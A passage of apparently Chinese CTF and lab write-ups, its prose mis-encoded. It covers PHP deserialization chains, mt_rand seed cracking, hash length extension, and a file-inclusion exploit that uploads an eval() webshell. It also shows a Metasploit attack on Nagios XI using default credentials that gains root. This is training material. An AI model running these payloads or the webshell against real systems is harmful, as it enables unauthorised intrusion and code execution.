<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$mod = <span class="keyword">new</span> Modifier();</span><br><span class="line">$mod();</span><br><span class="line"><span class="comment">//åœ¨ä¸‹é¢åˆ™ä¼šè‡ªåŠ¨è°ƒç”¨invokeæ–¹æ³•</span></span><br></pre></td></tr></table></figure>



<p>å¾€ä¸‹çœ‹å°±èƒ½çœ‹è§Testæ–¹æ³•ï¼Œå› ä¸ºå®ƒè¿”å›äº†ä¸€ä¸ªfunctionã€‚æ‰€ä»¥è®©Testå»get ä¸€ä¸‹Modifierç±»ï¼Œå°±ä¼šå…ˆè°ƒç”¨__getæ–¹æ³•ï¼Œç»“æœå› ä¸ºè¢«å½“æˆäº†å‡½æ•°è¿›è¡Œè°ƒç”¨ï¼Œæˆ‘ä»¬çš„Modifierç±»è‡ªåŠ¨çš„è°ƒç”¨äº†invokeæ–¹æ³•ã€‚</p>
<p>ç„¶åæˆ‘å¡åœ¨è¿™é‡Œå¥½ä¹…..æœ€åçœ‹äº†å¸ˆå‚…ä»¬çš„åšå®¢æ‰æƒ³åˆ°è¯¥æ€ä¹ˆå†™..è¯´å®è¯è¿˜æ˜¯æœ‰ç‚¹æ‡µé€¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨showå‡½æ•°å½“ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°__wakeupå‡½æ•°ï¼Œå› ä¸ºå®ƒè¿›è¡Œäº†echoæ“ä½œï¼Œæ­¤æ—¶ä¾¿ä¼šè§¦å‘stringå‡½æ•°</p>
<p>ä¿®æ”¹sourceçš„å€¼ã€‚</p>
<p>æœ€åè¦æ³¨æ„protectedå±æ€§ä¿®é¥°çš„å˜é‡åº”è¯¥ç”¨urlencodeè¿›è¡Œä¿®é¥°é¿å…ä¸å¯è§å­—ç¬¦</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line"><span class="comment">//    private $c;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> Test();</span><br><span class="line">$mod = <span class="keyword">new</span> Modifier();</span><br><span class="line">$show1 = <span class="keyword">new</span> Show();</span><br><span class="line">$show1 -&gt;str =$test;</span><br><span class="line">$show1-&gt;str-&gt;p = $mod;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$show2 = <span class="keyword">new</span> Show($show1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($show2));</span><br><span class="line"><span class="comment">//å½“æˆ‘ä»¬è§¦å‘</span></span><br></pre></td></tr></table></figure>



<p>è¿™é‡Œå°±æ˜¯è¿›è¡Œäº†ä¸€ä¸ªå¥—å¨ƒï¼Œå½“ååºåˆ—åŒ–çš„æ—¶å€™å‘¢ï¼Œshowæ–¹æ³•è¢«ååºåˆ—åŒ–ï¼Œè°ƒç”¨äº†wakeupçš„å‡½æ•°ï¼Œä¹‹ååˆå› ä¸º</p>
<p>__construct,è¿›è¡Œäº†ä¸€å¥è¾“å‡ºï¼Œæ‰€ä»¥å°±é€ æˆäº†toStringè°ƒç”¨ï¼Œåœ¨æ­¤ä¹‹å‰æˆ‘ä»¬æ„é€ å¥½è¯­å¥å³å¯</p>
<p>$show2 çº¯ç²¹çš„æ˜¯è¿›è¡Œä¸€æ¬¡wakeupè°ƒç”¨ï¼</p>
<p><img src="image-20201029191526057.png" alt="image-20201029191526057"></p>
<h1 id="6-Ezadult"><a href="#6-Ezadult" class="headerlink" title="6.Ezadult"></a>6.Ezadult</h1><p>é¡µé¢å•¥ä¹Ÿçœ‹ä¸å‡ºæ¥ï¼Œç›´æ¥<a href="http://www.zipä¸‹äº†ä¸€æ³¢ä»£ç ï¼Œä¹‹åå‘ç°æ˜¯ä¼ªéšæœºæ•°çˆ†ç ´ï¼Œæ„é€ ä¸¤ä¸ªè„šæœ¬ï¼š">www.zipä¸‹äº†ä¸€æ³¢ä»£ç ï¼Œä¹‹åå‘ç°æ˜¯ä¼ªéšæœºæ•°çˆ†ç ´ï¼Œæ„é€ ä¸¤ä¸ªè„šæœ¬ï¼š</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line">str2 = <span class="string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(str1) - <span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#ç»“æœ 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸‹è½½php_mt_randé‚£ä¸ªè„šæœ¬ï¼Œä½¿ç”¨æ•™ç¨‹ï¼š</p>
<p>è®°å¾—ç”¨makeç¼–è¯‘cè¯­è¨€çš„ä¸œè¥¿ï¼Œä¹‹å./è¿è¡Œå³å¯ï¼š</p>
<p><img src="image-20201029203700811.png" alt="image-20201029203700811"></p>
<p>è·‘å‡ºå…¬é’¥æ¥ï¼š1775196155</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="comment">//å…¬é’¥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params">$length = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ç§é’¥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params">$length = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> public_key();</span><br><span class="line"><span class="keyword">echo</span> private_key();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åå¯†ç ç”¨ä¸‡èƒ½å¯†ç ä¸€è¿‡ï¼Œå³å¯å¾—åˆ°flag</p>
<p>åé¢çš„ä¸¤ä¸ªä¸€ä¸ªå¤ªéš¾ä¸€ä¸ªæ˜¯é¢˜ç›®downæ‰äº†å®Œå…¨ç”¨ä¸äº†ã€‚ã€‚</p>
]]></content>
  </entry>
  <entry>
    <title>NPUCTF2020</title>
    <url>/2020/10/30/NPUCTF2020/</url>
    <content><![CDATA[<h1 id="webğŸ•"><a href="#webğŸ•" class="headerlink" title="webğŸ•"></a>webğŸ•</h1><p>åˆ—è¡¨å†…å®¹å¤åˆ¶ç²˜è´´ï¼Œä¸¢pythoné‡Œé¢è·‘ä¸€è½®å°±è¡Œäº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">54</span>, <span class="number">95</span>, <span class="number">52</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">52</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">103</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">125</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    print(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>å•Šï¼Œåˆ«çœ‹äº†ï¼Œè¿™ä¸Šé¢å¤ªä¸¢äººäº†ã€‚ã€‚ã€‚åŸæ¥æ˜¯å› ä¸ºè¿™æ˜¯æœ€åä¸€æ­¥ï¼Œ</p>
<h1 id="ReadlezPHP"><a href="#ReadlezPHP" class="headerlink" title="ReadlezPHP"></a>ReadlezPHP</h1><p>è¿™é“é¢˜ç›®å’Œä¹‹å‰åœ¨ç½‘é¼æ¯åšçš„phpwebå¾ˆåƒï¼Œä¸€æ ·çš„æ˜¯è¿›è¡ŒåŠ¨è°ƒï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure>

<p>flagè¯´æ˜¯åœ¨phpinfoå½“ä¸­,æ„é€ å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> HelloPhp();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<h1 id="Ezinclude"><a href="#Ezinclude" class="headerlink" title="Ezinclude"></a>Ezinclude</h1><p><img src="image-20201030092624788.png" alt="image-20201030092624788"></p>
<p>ç¬¬ä¸€æ­¥ï¼Œè¿™é‡Œè¯´æ˜¯cookiesé‡Œé¢æœ‰ä¸€ä¸ªhashï¼Œæ˜¯hashæ‹“å±•æ”»å‡»ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://ha1cyon-ctf.fun:30004/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    a,b=hashpumpy.hashpump(<span class="string">&#x27;a3dabbc779f2fbf8b6f56113ca78a7f9&#x27;</span>,<span class="string">&#x27;123444&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,i)</span><br><span class="line"></span><br><span class="line">    req=requests.get(url+<span class="string">&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(urllib.parse.quote(b),a))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username/password error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        print(req.text,url+<span class="string">&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(urllib.parse.quote(b),a))</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p>?ç„¶è€Œå®é™…åšçš„æ—¶å€™æŠŠcookiesçš„å€¼ä¸¢è¿›å»å½“ä½œpasswordçš„å°±è¿‡å»äº†ã€‚</p>
<p><img src="image-20201030092846076.png" alt="image-20201030092846076"></p>
<p>è¯»å–åˆ°ä¸‰ä¸ªphpæ–‡ä»¶ï¼š</p>
<p>flflflflag.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,$file))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">@$name=$_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">@$pass=$_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(md5($secret.$name)===$pass)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span></span><br><span class="line"><span class="string">           window.location.href=&quot;flflflflag.php&quot;;</span></span><br><span class="line"><span class="string">	&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	setcookie(<span class="string">&quot;Hash&quot;</span>,md5($secret.$name),time()+<span class="number">3600000</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;username/password error&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>config.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$secret=<span class="string">&#x27;%^$&amp;$#fffdflag_is_not_here_ha_ha&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç”¨dirbè¿˜èƒ½æ‰«å‡ºæ¥ä¸€ä¸ªdir.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">		<span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">		[<span class="number">0</span>]=&gt;</span><br><span class="line">		<span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span></span><br><span class="line">		[<span class="number">1</span>]=&gt;</span><br><span class="line">		<span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">include</span>($_GET[<span class="string">&quot;file&quot;</span>])&lt;/body&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¼šåˆ—å‡ºtmpç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œ</p>
<p>é‚£çœ‹æ¥è¿˜æ˜¯è¦å†™ğŸè¿›å»å•Šï¼Œå¯æ˜¯ä¼ªåè®®è¢«è¿‡æ»¤äº†è¯¥æ€ä¹ˆå†™ğŸå‘¢ï¼Ÿ</p>
<p>å‚è€ƒæ–‡ç« ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;183046</span><br></pre></td></tr></table></figure>

<p>ä»è¿™ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œå½“PHPé™·å…¥å´©æºƒçš„æ—¶å€™ä»–ä¼šè‡ªåŠ¨çš„é‡å¯ï¼Œæ¸…ç†æ‰è‡ªå·±çš„å†…å­˜ï¼Œä½†æ˜¯ä¸æ­¤åŒæ—¶è¿™å°±ä¼šå¯¼è‡´PHPä¼šåœæ­¢è‡ªå·±æ‰‹å¤´çš„å·¥ä½œï¼Œè¿™æ ·çš„è¯äºæ­¤åŒæ—¶æˆ‘ä»¬ç›´æ¥POSTä¸€æ®µæ•°æ®ï¼Œå°†ä¼šè¢«phpä¿å­˜è‡³tmpç›®å½•ä¸‹æ²¡æœ‰åœä¸‹ã€‚éšæœºç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯åˆæ ¹æ®é¢˜ç›®çš„dir.phpï¼Œå¯ä»¥è®©æˆ‘ä»¬çœ‹è§tmpç›®å½•ä¸‹æœ‰ä»€ä¹ˆï¼Œæ‰€ä»¥ç›´æ¥åŒ…è£¹å³å¯~</p>
<p>æŠ„æ¥çš„expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_POST[a]);?&gt;&quot;</span></span><br><span class="line">file_data=&#123;</span><br><span class="line">   <span class="string">&#x27;file&#x27;</span>: BytesIO(payload.encode())</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">&quot;http://a53738f6-1115-449b-b4af-167a2c1a5b1a.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   r=requests.post(url=url,files=file_data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">        print(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>é‡ç‚¹å°±æ˜¯ç”¨string.strip_tagsè¿™ä¸€ç‚¹æ„é€ å‡ºphpçš„å†…å­˜æº¢å‡ºå³å¯å¾—åˆ°ã€‚ä¹‹åè®¿é—®dir.phpå¯ä»¥çœ‹è§æœ‰ä»€ä¹ˆæ–‡ä»¶æˆåŠŸä¸Šä¼ ï¼š</p>
<p><img src="image-20201031145743370.png" alt="image-20201031145743370"></p>
<p>è¿›è¡Œæ–‡ä»¶åŒ…å«å³å¯</p>
<p><img src="image-20201031150107473.png" alt="image-20201031150107473"></p>
<p>flagä¸€æ ·çš„PHP infoï¼ˆï¼‰å½“ä¸­</p>
]]></content>
  </entry>
  <entry>
    <title>Nagiosæ¸—é€</title>
    <url>/2020/11/08/Nagios%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h1 id="ç¬¬ä¸€æ­¥ï¼š"><a href="#ç¬¬ä¸€æ­¥ï¼š" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼š"></a>ç¬¬ä¸€æ­¥ï¼š</h1><p>ç»å…¸NMAP</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nmap -sS -v -T4 -Pn -A -p <span class="number">0</span>-<span class="number">65535</span> <span class="number">172</span>.<span class="number">192</span>.<span class="number">168</span>.<span class="number">235</span>.<span class="number">135</span></span><br></pre></td></tr></table></figure>

<p>drib</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">dirb http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">29</span>.<span class="number">128</span>/</span><br></pre></td></tr></table></figure>



<p>Nmapçš„ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="image-20201108194244662.png" alt="image-20201108194244662"></p>
<p>è€Œdirbçš„ç»“æœï¼š</p>
<p><img src="image-20201108194339973.png" alt="image-20201108194339973"></p>
<p>æ„Ÿè§‰æœ‰ç‚¹é¸¡è‚‹å•Š..dirbçš„ç»“æœ</p>
<h1 id="ç¬¬äºŒæ­¥"><a href="#ç¬¬äºŒæ­¥" class="headerlink" title="ç¬¬äºŒæ­¥"></a>ç¬¬äºŒæ­¥</h1><p>WTMç›´æ¥ç”¨expåº“</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">searchsploit nagios</span><br></pre></td></tr></table></figure>



<p>msfconsole</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">search nagios</span><br></pre></td></tr></table></figure>

<p>ä¹‹åä½¿ç”¨show optionsæŸ¥çœ‹æˆ‘ä»¬éœ€è¦å¡«å†™ä»€ä¹ˆ</p>
<p>æŸ¥çœ‹è¿˜éœ€è¦è®¾ç½®çš„é€‰é¡¹ show optionsï¼Œä¸ºYESä¸”ç©ºçš„å°±æ˜¯è¿˜éœ€è¦æˆ‘ä»¬è®¾ç½®çš„ã€‚ å¯ä»¥çœ‹åˆ°ä¸‹å›¾ä¸­RHOSTå‚æ•°è¿˜æœªè®¾ç½®å†…å®¹</p>
<p><img src="1089831-20170102213249769-373635510.png" alt="img"></p>
<p>å‘ç°è¿™ä¸ªéœ€è¦è®¾ç½®å¯†ç ï¼Œäºæ˜¯å°è¯•æµ‹è¯•é»˜è®¤å¯†ç ç™»é™†NagiosXIï¼Œåœ¨è¯¥æ–‡ç« ä¸­å¾—åˆ°è´¦å·ä¸ºNagiosAdmin</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ywnz.com&#x2F;linuxyffq&#x2F;6587.html</span><br></pre></td></tr></table></figure>

<p>å¯†ç ä¸ºadmin</p>
<p>è¿™é‡Œè®²ä¸€ä¸‹msfconsoleæ€ä¹ˆç”¨çš„..</p>
<h1 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h1><p>é¦–å…ˆsearch æ¼æ´</p>
<p>show options å¯ä»¥æŸ¥çœ‹æœ‰ä»€ä¹ˆæ¡ä»¶æˆ‘ä»¬è¿˜æ²¡æœ‰è®¾ç½®</p>
<p>å†ä¹‹åè®¾ç½®rhostå’Œlhostï¼Œå…¶ä¸­rhostä¸ºè¢«æ”»å‡»çš„æœºå­</p>
<p><strong>lhostä¸ºæ”»å‡»æœºï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„kali</strong></p>
<p>ä¹‹åç›´æ¥runï¼Œå‘ç°å¤±è´¥</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">] Exploit aborted due to failure: no-access: Authentication failed. Please provide a valid username and password.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>äºæ˜¯æŠŠæˆ‘ä»¬åˆšåˆšå¾—åˆ°çš„passwordå¡«å†™ä¸Šå»admin</p>
<p>å¾—åˆ°runä¹‹åæ‰§è¡Œshellï¼ŒwhoamiæŸ¥çœ‹æƒé™å°±æ˜¯rootäº†</p>
]]></content>
  </entry>
  <entry>
    <title>PHPçš„ä¸€ä¸ªå†…ç½®ç±»</title>
